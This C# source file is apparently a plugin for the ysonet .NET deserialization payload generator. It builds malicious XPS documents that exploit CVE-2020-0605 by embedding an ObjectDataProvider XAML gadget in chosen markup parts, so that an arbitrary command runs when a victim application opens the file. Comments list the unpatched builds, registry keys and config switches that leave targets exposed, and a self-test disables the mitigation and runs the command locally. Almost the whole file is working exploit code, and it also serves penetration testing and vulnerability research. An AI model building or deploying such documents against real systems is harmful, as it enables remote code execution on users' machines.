using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Packaging;
using System.Text;
using ysonet.Generators;
using ysonet.Helpers;

/**
 * Author: Soroush Dalili (@irsdl)
 *
 * Comments:
 *  Builds a malicious XPS document (CVE-2020-0605). An XPS file is an OPC (ZIP) package
 *  whose markup parts are parsed as XAML by .NET, so an ObjectDataProvider in any of them
 *  runs a command when a consumer application opens the document.
 *
 *  Research: "Analysis of CVE-2020-0605 - code execution using XPS files in .NET",
 *  MDSec, May 2020 (Soroush Dalili). The inner ObjectDataProvider XAML gadget is by
 *  Oleksandr Mirosh and Alvaro Munoz ("Friday the 13th JSON attacks", Black Hat USA 2017)
 *  and is built here by ysonet's own ObjectDataProviderGenerator.
 *
 *  How the target parses it, and where the payload can sit (see --mode):
 *   - fdseq: the FixedDocumentSequence start part. XpsDocument.GetFixedDocumentSequence
 *     hands it to XamlReader BEFORE it checks the result type, so the command runs even
 *     though the load then fails. Restricted since the January 2020 patch, which added
 *     MS.Internal.ReachFramework.Markup.XamlReaderProxy in ReachFramework.
 *   - fdoc: the FixedDocument part, reached through DocumentReference.GetDocument.
 *   - fpage: the FixedPage part, reached through PageContent.GetPageRoot.
 *     Both fdoc and fpage go through System.Windows.Documents.XpsValidatingLoader in
 *     PresentationFramework, which the January 2020 patch did NOT cover; that came in a
 *     later 2020 update.
 *   - all: put the payload in every part, for a target of unknown patch level.
 *
 *  When this actually lands:
 *   Both loaders now ask for a RestrictiveXamlXmlReader, whose deny list names
 *   System.Windows.Data.ObjectDataProvider, so a DEFAULT patched host BLOCKS this. It
 *   still runs when the target
 *     - predates the fix (January 2020 for the .fdseq, later in 2020 for .fdoc/.fpage), or
 *     - sets DisableLegacyDangerousXamlDeserializationMode=false in its appSettings, or
 *     - has HKCU\Software\Microsoft\Avalon.Xaml\DisableLegacyDangerousXamlDeserializationMode
 *       set to the DWORD 0, or
 *     - re-allows the type through HKLM\SOFTWARE\Microsoft\.NETFramework\
 *       Windows Presentation Foundation\XPSAllowedTypes.
 *   --test proves both halves locally: the restricted default load, then the same document
 *   with the legacy switches flipped for this process only.
 *
 *  Victim entry points for the file: any application that opens it with
 *  System.Windows.Xps.Packaging.XpsDocument (a WPF DocumentViewer, an XPS viewer, a
 *  converter), and PrintQueue.AddJob(path), which the same MDSec analysis documents.
 *
 *  Related: the ClipboardPlugin 'wpfxaml' mode is the CLIPBOARD PASTE sink of the same
 *  January 2020 mitigation family (CVE-2020-0605/0606). Same inner gadget, same
 *  restrictive reader, different delivery: that one needs a paste, this one is a file.
 **/

namespace ysonet.Plugins
{
    public class XpsPlugin : IPlugin, IPluginModes
    {
        static string mode = "fdseq";
        static string command = "";
        static bool test = false;
        static bool minify = false;
        static bool useSimpleType = true;
        static bool rawcmd = false;

        // XPS part names. Any layout works as long as the start part relationship points
        // at the FixedDocumentSequence; these match what real XPS writers produce.
        private const string FixedDocSeqPart = "/FixedDocSeq.fdseq";
        private const string FixedDocPart = "/Documents/1/FixedDoc.fdoc";
        private const string FixedPagePart = "/Documents/1/Pages/1.fpage";

        // Content types and the start part relationship, taken from ReachFramework's own
        // XpsS0Markup. The content type is what puts a part on the XAML parsing path
        // (BindUriHelper.IsXamlMimeType), so these strings are load bearing.
        private const string FixedDocSeqContentType = "application/vnd.ms-package.xps-fixeddocumentsequence+xml";
        private const string FixedDocContentType = "application/vnd.ms-package.xps-fixeddocument+xml";
        private const string FixedPageContentType = "application/vnd.ms-package.xps-fixedpage+xml";
        private const string StartPartRelationship = "http://schemas.microsoft.com/xps/2005/06/fixedrepresentation";

        // The XPS markup namespace. PresentationFramework maps it to System.Windows.Documents
        // (and System.Windows.Data), so the XPS elements below resolve to the real WPF types.
        private const string XpsNamespace = "http://schemas.microsoft.com/xps/2005/06";

        static OptionSet options = new OptionSet()
            {
                {"m|mode=", "which markup part carries the payload: 'fdseq' (default, the FixedDocumentSequence start part), 'fdoc' (the FixedDocument part), 'fpage' (the FixedPage part), or 'all'. The parts were patched at different times, so this chooses what a given target build still parses unrestricted.", v => { if (v != null) mode = v.Trim().ToLowerInvariant(); } },
                {"c|command=", "the command to be executed", v => command = v },
                {"t|test", "whether to run the payload locally. This opens the generated document twice: once with the patched default (must be blocked) and once with the legacy switches flipped FOR THIS PROCESS ONLY, which runs your command. Default: false", v => test = v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify = v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType = v != null },
                {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
            };

        public string Name()
        {
            return "Xps";
        }

        public string Description()
        {
            return "Generates a malicious XPS document (CVE-2020-0605) - binary output, use --outputpath to save it as an .xps file";
        }

        public string Credit()
        {
            return "Soroush Dalili";
        }

        public OptionSet Options()
        {
            return options;
        }

        // Interactive-only mode descriptions (see IPluginModes). Each maps to a value of
        // this plugin's own --mode option, so the CLI is unchanged.
        public List<PluginMode> InteractiveModes()
        {
            return new List<PluginMode>
            {
                new PluginMode {
                    Name = "FixedDocumentSequence part (.fdseq)",
                    Description = "Payload in the start part, parsed by XpsDocument.GetFixedDocumentSequence.",
                    Options = new string[] { "command", "test", "minify", "usesimpletype", "rawcmd" },
                    Required = new string[] { "command" },
                    Preset = new Dictionary<string, string> { { "mode", "fdseq" } },
                },
                new PluginMode {
                    Name = "FixedDocument part (.fdoc)",
                    Description = "Payload in the document part, parsed by XpsValidatingLoader via DocumentReference.",
                    Options = new string[] { "command", "test", "minify", "usesimpletype", "rawcmd" },
                    Required = new string[] { "command" },
                    Preset = new Dictionary<string, string> { { "mode", "fdoc" } },
                },
                new PluginMode {
                    Name = "FixedPage part (.fpage)",
                    Description = "Payload in the page part, parsed by XpsValidatingLoader via PageContent.",
                    Options = new string[] { "command", "test", "minify", "usesimpletype", "rawcmd" },
                    Required = new string[] { "command" },
                    Preset = new Dictionary<string, string> { { "mode", "fpage" } },
                },
                new PluginMode {
                    Name = "Every part (unknown patch level)",
                    Description = "Payload in all three markup parts at once.",
                    Options = new string[] { "command", "test", "minify", "usesimpletype", "rawcmd" },
                    Required = new string[] { "command" },
                    Preset = new Dictionary<string, string> { { "mode", "all" } },
                },
            };
        }

        public object Run(string[] args)
        {
            // Options live in static fields and this plugin can be run more than once in
            // one process (the test suite does), so every field goes back to its documented
            // default before parsing.
            mode = "fdseq";
            command = "";
            test = false;
            minify = false;
            useSimpleType = true;
            rawcmd = false;

            InputArgs inputArgs = new InputArgs();

            try
            {
                options.Parse(args);
                inputArgs.Cmd = command;
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
                inputArgs.IsRawCmd = rawcmd;
                inputArgs.Test = test;
            }
            catch (OptionException e)
            {
                Console.Write("ysonet: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception(e.Message);
            }

            if (mode != "fdseq" && mode != "fdoc" && mode != "fpage" && mode != "all")
            {
                Console.Write("ysonet: ");
                Console.WriteLine("Unknown mode '" + mode + "'. Use 'fdseq', 'fdoc', 'fpage' or 'all'.");
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception("Unknown mode '" + mode + "'. Use 'fdseq', 'fdoc', 'fpage' or 'all'.");
            }

            if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
            {
                Console.Write("ysonet: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception("Incorrect plugin mode/arguments combination");
            }

            byte[] xps = BuildXpsPackage(inputArgs, mode);

            if (test)
            {
                RunXpsOpenTest(xps, inputArgs);
            }

            return xps;
        }

        // The command-running XAML. ObjectDataProvider variant 2 is a ResourceDictionary
        // holding the provider under an empty key, which is exactly the shape a WPF
        // element's .Resources property accepts, so it drops into any of the three parts
        // unchanged. ExtraInternalArguments is how a caller steers an inner generator
        // (GenerateInner deliberately drops the outer module's own options).
        private static string ObjectDataProviderResourceDictionary(InputArgs inputArgs)
        {
            InputArgs innerArgs = inputArgs.DeepCopy();
            innerArgs.ExtraInternalArguments = new List<string> { "--variant", "2" };

            string xaml = (string)new ObjectDataProviderGenerator().GenerateInner("xaml", innerArgs);

            // XamlWriter writes a standalone document, so its output starts with an XML
            // declaration. That is only legal at the very start of a document, and this
            // block becomes a CHILD element of the XPS part, so the declaration has to go.
            return StripXmlDeclaration(xaml);
        }

        private static string StripXmlDeclaration(string xml)
        {
            if (xml == null) return "";

            string trimmed = xml.TrimStart();
            if (!trimmed.StartsWith("<?xml")) return trimmed;

            int end = trimmed.IndexOf("?>", StringComparison.Ordinal);
            if (end < 0) return trimmed;

            return trimmed.Substring(end + 2).TrimStart();
        }

        // The three markup parts. Each is a normal, well formed XPS part; the only unusual
        // thing is the ResourceDictionary in its .Resources property. A part that does not
        // carry the payload is written unchanged, so the document still opens normally.
        private static string FixedDocSeqMarkup(string resources)
        {
            return
@"<FixedDocumentSequence xmlns=""" + XpsNamespace + @""">
" + ResourcesBlock("FixedDocumentSequence", resources) + @"  <DocumentReference Source=""" + FixedDocPart + @""" />
</FixedDocumentSequence>";
        }

        private static string FixedDocMarkup(string resources)
        {
            return
@"<FixedDocument xmlns=""" + XpsNamespace + @""">
" + ResourcesBlock("FixedDocument", resources) + @"  <PageContent Source=""" + FixedPagePart + @""" />
</FixedDocument>";
        }

        private static string FixedPageMarkup(string resources)
        {
            // Width and Height are required on a FixedPage. The values are a normal
            // US Letter page at 96 dpi; nothing depends on them.
            return
@"<FixedPage xmlns=""" + XpsNamespace + @""" Width=""816"" Height=""1056"" xml:lang=""en-us"">
" + ResourcesBlock("FixedPage", resources) + @"  <Canvas />
</FixedPage>";
        }

        private static string ResourcesBlock(string ownerElement, string resources)
        {
            if (String.IsNullOrEmpty(resources)) return "";

            return "  <" + ownerElement + ".Resources>\r\n" + resources + "\r\n  </" + ownerElement + ".Resources>\r\n";
        }

        // Assemble the OPC package. System.IO.Packaging writes [Content_Types].xml and
        // _rels/.rels itself from the parts and relationships created here.
        private static byte[] BuildXpsPackage(InputArgs inputArgs, string payloadMode)
        {
            string resources = ObjectDataProviderResourceDictionary(inputArgs);

            bool inSeq = payloadMode == "fdseq" || payloadMode == "all";
            bool inDoc = payloadMode == "fdoc" || payloadMode == "all";
            bool inPage = payloadMode == "fpage" || payloadMode == "all";

            using (MemoryStream ms = new MemoryStream())
            {
                using (Package package = Package.Open(ms, FileMode.Create, FileAccess.ReadWrite))
                {
                    WritePart(package, FixedDocSeqPart, FixedDocSeqContentType,
                        FixedDocSeqMarkup(inSeq ? resources : null));
                    WritePart(package, FixedDocPart, FixedDocContentType,
                        FixedDocMarkup(inDoc ? resources : null));
                    WritePart(package, FixedPagePart, FixedPageContentType,
                        FixedPageMarkup(inPage ? resources : null));

                    // The start part relationship is how XpsDocument finds the document
                    // sequence. Without it the package is not an XPS document at all.
                    package.CreateRelationship(
                        new Uri(FixedDocSeqPart, UriKind.Relative),
                        TargetMode.Internal,
                        StartPartRelationship);
                }

                return ms.ToArray();
            }
        }

        private static void WritePart(Package package, string partPath, string contentType, string markup)
        {
            PackagePart part = package.CreatePart(
                new Uri(partPath, UriKind.Relative), contentType, CompressionOption.Normal);

            byte[] bytes = new UTF8Encoding(false).GetBytes(markup);
            using (Stream stream = part.GetStream(FileMode.Create, FileAccess.Write))
            {
                stream.Write(bytes, 0, bytes.Length);
            }
        }

        // Local self-test. WARNING: the second half runs the command.
        // It opens the generated document exactly as a consumer application does, twice:
        //  1) with the framework switches at their patched defaults, which must block it;
        //  2) with the legacy switches flipped IN THIS PROCESS ONLY, which is what a target
        //     that opted out of the mitigation looks like, and which runs the command.
        // The switches are process-wide statics, so they are always restored.
        // All diagnostic output goes to stderr so stdout/piping stays clean.
        private static void RunXpsOpenTest(byte[] xps, InputArgs inputArgs)
        {
            string tempFile = Path.Combine(Path.GetTempPath(),
                "ysonet_xps_" + Guid.NewGuid().ToString("N") + ".xps");

            Console.Error.WriteLine("[xps test] Opening the generated document locally. The second pass runs your command.");

            try
            {
                File.WriteAllBytes(tempFile, xps);

                Console.Error.WriteLine("[xps test] 1) patched default (RestrictiveXamlXmlReader active):");
                Exception blocked = SerializersHelper.Xps_load_and_walk_sta(tempFile);
                if (blocked == null)
                    Console.Error.WriteLine("[xps test]    document parsed and the gadget was dropped, so nothing ran. This is the safe default.");
                else
                    Console.Error.WriteLine("[xps test]    blocked with an exception (gadget did not run): " + blocked.GetType().Name + ": " + blocked.Message);

                Console.Error.WriteLine("[xps test] 2) legacy mode (target opted out of the mitigation, or predates it):");
                bool[] previous = null;
                try
                {
                    previous = SerializersHelper.Xps_set_legacy_dangerous_mode(true);
                    Exception fired = SerializersHelper.Xps_load_and_walk_sta(tempFile);
                    if (fired == null)
                        Console.Error.WriteLine("[xps test]    document parsed; the gadget ran if the payload part was reached.");
                    else
                        Console.Error.WriteLine("[xps test]    the walk ended with " + fired.GetType().Name + ": " + fired.Message +
                            " (the command still runs when the payload part parsed before the error).");
                }
                catch (NotSupportedException nse)
                {
                    Console.Error.WriteLine("[xps test]    " + nse.Message);
                }
                finally
                {
                    // Process-wide statics: never leave them flipped.
                    if (previous != null)
                    {
                        try { SerializersHelper.Xps_restore_legacy_dangerous_mode(previous); }
                        catch (Exception restoreError) { Debugging.ShowErrors(inputArgs, restoreError); }
                    }
                }
            }
            catch (Exception err)
            {
                Debugging.ShowErrors(inputArgs, err);
            }
            finally
            {
                try { if (File.Exists(tempFile)) File.Delete(tempFile); } catch { }
            }
        }
    }
}
